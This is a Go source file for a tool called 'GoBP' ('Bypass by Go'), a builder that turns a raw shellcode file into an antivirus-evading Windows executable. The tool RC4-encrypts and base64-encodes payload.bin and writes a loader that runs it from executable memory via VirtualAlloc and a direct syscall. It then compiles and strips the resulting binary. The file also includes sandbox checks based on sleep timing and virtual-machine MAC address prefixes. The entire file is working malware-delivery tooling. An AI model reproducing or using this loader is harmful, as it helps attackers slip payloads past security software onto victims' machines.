package main

import (
	"bytes"
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const Version = "1.1"
const Banner = `

  ____       ____  ____  
 / ___| ___ | __ )|  _ \ 
| |  _ / _ \|  _ \| |_) |
| |_| | (_) | |_) |  __/ 
 \____|\___/|____/|_|    

					
Bypass by Go
Author:AntiFire
`

func ShowBanner() {

	fmt.Printf(Banner)

}

func Delay() (int, error) {
	startTime := time.Now()
	time.Sleep(10 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(10*time.Second) {
		return 1, nil
	} else {
		return 0, nil
	}
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var macList = []string{"00:0c:29", "00:50:56", "08:00:27", "52:54:00 ", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28", "00:01:5D", "00:21:F6", "00:A0:A4",
	"00:07:82", "00:03:BA", "08:00:20", "2C:C2:60", "00:10:4F", "00:0F:4B", "00:13:97", "00:20:F2", "00:14:4F"}

func getMacAddr() []string {
	ifas, _ := net.Interfaces()

	var as []string
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			as = append(as, a)
		}
	}
	return as
}

func ByMacAddress() bool {
	return ContainsPrefix(macList, getMacAddr()[0])

}
func ContainsPrefix(s []string, macAdress string) bool {
	for _, v := range s {
		return strings.HasPrefix(macAdress, v)
	}

	return false
}
func read(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}

func randomInt(min, max int) int {
	return min + rand.Intn(max-min)
}

func genGoExe() {
	cmd := exec.Command("cmd.exe", "/c", `start go mod init main`)
	cmd.Dir = "GoBPTemp"

	if err := cmd.Run(); err != nil {
		fmt.Println("No Go Env")
		return
	}

	cmd2 := exec.Command("cmd.exe", "/c", "start", "go", "build", "-ldflags", "-s -w", "GOrun.go")
	var stderr2 bytes.Buffer
	cmd2.Stderr = &stderr2
	cmd2.Dir = "GoBPTemp"
	if err := cmd2.Run(); err != nil {
		fmt.Println(stderr2.String())
		return
	}

	cmd3 := exec.Command("cmd.exe", "/c", "copy .\\GOrun.exe .\\..\\GoBP.exe && exit")
	var stderr3 bytes.Buffer
	cmd3.Stderr = &stderr3
	cmd3.Dir = "GoBPTemp"
	if err := cmd3.Run(); err != nil {
		fmt.Println(stderr3.String())
		return
	}
	//os.RemoveAll("./GoBPTemp")

	cmd_go_strip := exec.Command("cmd.exe", "/c", "go-strip.exe -f ..\\GoBP.exe -a -output ..\\GoBP.exe")

	cmd_go_strip.Dir = "Tool"
	cmd_go_strip.Run()
	time.Sleep(5)

}
func randomString(len int) string {
	rand.Seed(time.Now().UnixNano())
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(randomInt(65, 90))
	}
	return string(bytes)
}

var key string = randomString(5)

func enc(src string) string {
	shellcode := []byte(src)
	enc_shellcode := make([]byte, len(shellcode))

	cipher1, _ := rc4.NewCipher([]byte(key))
	cipher1.XORKeyStream(enc_shellcode, shellcode)

	base64Rc4_shellcode := base64.StdEncoding.EncodeToString(enc_shellcode)
	return base64Rc4_shellcode

}

func runshellcode(charcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("Can't call VirtualAlloc")
		fmt.Println(err.Error())
		os.Exit(1)

	}

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}

	syscall.Syscall(addr, 0, 0, 0, 0)

}

func dec(src string) []byte {
	debase64_data, _ := base64.StdEncoding.DecodeString(src)

	dec_shellcode := make([]byte, len(debase64_data))
	cipher2, _ := rc4.NewCipher([]byte(key))
	cipher2.XORKeyStream(dec_shellcode, debase64_data)
	return dec_shellcode

}

var Gocode1 = `
package main

import (
	"crypto/rc4"
	"encoding/base64"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)


func runshellcode(charcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	
	

	//Delay()
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))

	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	//Delay()

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func dec(src string) []byte {
	debase64_data, _ := base64.StdEncoding.DecodeString(src)

	dec_shellcode := make([]byte, len(debase64_data))
	cipher2, _ := rc4.NewCipher([]byte(key)) 
	cipher2.XORKeyStream(dec_shellcode, debase64_data)
	return dec_shellcode
	

}



	var enc_data = "`

var codeKey = `"
	var key string = "`

var Gocode2 = `"

func main() {
	shellcodefin := dec(enc_data)
	runshellcode(shellcodefin)
}
`

func main() {
	ShowBanner()
	enc_data := enc(string(read("./payload.bin")))
	codeText := Gocode1 + enc_data + codeKey + key + Gocode2

	//fmt.Print(codeText)
	os.Mkdir("GoBPTemp", 0777)
	f, err := os.OpenFile("GoBPTemp/GOrun.go", os.O_WRONLY|os.O_CREATE, 0600)

	if err != nil {
		fmt.Print("Create folder failed")
	}
	defer f.Close()
	io.WriteString(f, codeText)
	f.Close()
	// Generate Go payload
	genGoExe()
	fmt.Print("GoBP Generate!")

}
